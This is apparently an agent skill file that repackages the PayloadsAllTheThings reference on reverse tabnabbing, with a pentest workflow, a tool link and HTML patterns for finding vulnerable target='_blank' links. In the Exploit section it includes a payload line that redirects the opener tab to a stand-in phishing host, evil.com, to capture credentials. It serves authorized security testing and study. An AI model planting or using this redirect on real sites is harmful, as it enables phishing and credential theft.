---
name: payloads-tabnabbing
description: "Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or..."
---

# Tabnabbing Payloads

> **Source:** [PayloadsAllTheThings/Tabnabbing](https://github.com/swisskyrepo/payloadsallthethings/tree/master/Tabnabbing)
> **Category:** `payloads-research` | **Skill ID:** `payloads-tabnabbing`

## Overview

Reverse tabnabbing payloads using window.opener for phishing and session credential theft.

This skill integrates the full **PayloadsAllTheThings** (PATT) payload library for the **Tabnabbing Payloads** domain into the REA_Skill framework. Use it during authorized penetration testing, bug bounty research, security audits, and CTF challenges.

## Workflow

### 1. Recon & Identification
- Identify the target technology stack and injection points
- Enumerate endpoints, parameters, and input vectors
- Determine applicable payload categories from the reference below

### 2. Payload Selection
- Browse the PATT payload library for the attack class
- Select encoding-appropriate payloads for the target environment
- Consider WAF bypass variants and obfuscation techniques

### 3. Exploitation (Authorized Only)
- Test payloads in order: passive → active → escalation
- Document every payload tested and its response
- Capture PoC evidence (screenshots, HTTP logs, curl output)

### 4. Verification & Reporting
- Confirm the vulnerability with a clean minimal PoC
- Map findings to CVE/CWE where applicable
- Report with remediation recommendations and code fixes

---

## Full PATT Reference

# Tabnabbing

> Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
* [Exploit](#exploit)
* [Discover](#discover)
* [References](#references)

## Tools

* [PortSwigger/discovering-reversetabnabbing](https://portswigger.net/bappstore/80eb8fd46bf847b4b17861482c2f2a30) - Discovering Reverse Tabnabbing

## Methodology

When tabnabbing, the attacker searches for links that are inserted into the website and are under his control. Such links may be contained in a forum post, for example. Once he has found this kind of functionality, it checks that the link's `rel` attribute does not contain the value `noopener` and the target attribute contains the value `_blank`. If this is the case, the website is vulnerable to tabnabbing.

## Exploit

1. Attacker posts a link to a website under his control that contains the following JS code: `window.opener.location = "http://evil.com"`
2. He tricks the victim into visiting the link, which is opened in the browser in a new tab.
3. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website.
4. If the victim opens the background tab again and doesn't look at the address bar, it may happen that he thinks he is logged out, because a login page appears, for example.
5. The victim tries to log on again and the attacker receives the credentials

## Discover

Search for the following link formats:

```html
<a href="..." target="_blank" rel=""> 
<a href="..." target="_blank">
```

## References

* [Reverse Tabnabbing - OWASP - October 20, 2020](https://web.archive.org/web/20200428035205/https://owasp.org/www-community/attacks/Reverse_Tabnabbing)
* [Tabnabbing - Wikipedia - May 25, 2010](https://web.archive.org/web/20251216150740/https://en.wikipedia.org/wiki/Tabnabbing)

---

## REA MCP Integration

```javascript
// REA MCP — Automated payload injection via REA tools
// Use analyze_function, procedure_pseudo_code, or observe_native_calls
// to identify injection sinks, then apply payloads from this skill.
```

## Legal Notice

> ⚠️ **Authorized Use Only.** All payloads in this skill are for security research, penetration testing with written permission, CTF competitions, and defensive study. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
